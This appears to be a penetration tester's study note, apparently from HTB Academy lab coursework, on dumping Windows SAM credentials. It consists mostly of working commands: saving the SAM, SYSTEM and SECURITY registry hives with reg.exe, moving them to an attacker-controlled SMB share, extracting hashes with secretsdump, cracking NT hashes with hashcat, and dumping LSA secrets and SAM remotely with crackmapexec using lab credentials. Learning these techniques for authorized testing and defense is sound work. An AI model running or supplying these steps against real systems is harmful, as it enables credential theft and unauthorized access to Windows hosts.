# Attacking SAM

### Copying SAM Registry Hives

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

We can create backups of these hives using the `reg.exe` utility.

```
cd C:\WINDOWS\system32
```

```cmd-session
 reg.exe save hklm\sam C:\sam.save
```

```cmd-session
reg.exe save hklm\system C:\system.save
```

```cmd-session
reg.exe save hklm\security C:\security.save
```

* to copy files use
  * \[\[Create SMB server Linux (HACK)]]

```cmd-session
move sam.save \\10.10.14.234\CompData
```

```cmd-session
move security.save \\10.10.14.234\CompData
```

```cmd-session
move system.save \\10.10.14.234\CompData
```

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Cracking Hashes with Hashcat**

* \[\[Hashcat]]
* copy Hashes into file

```
31d6cfe0d16ae931b73c59d7e0c089c0
72639bbb94990305b5a015220f8de34e
3c0e5d303ec84884ad5c3b7876a06ea6
a3ecf31e65208382e23b3420a34208fc
c02478537b9727d391bc80011c2e2321
58a478135a93ac3bf058a5ea0e8fdb71
```

```shell-session
 sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

## Remote Dumping & LSA Secrets Considerations

* \[\[CrackMapExec]]

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
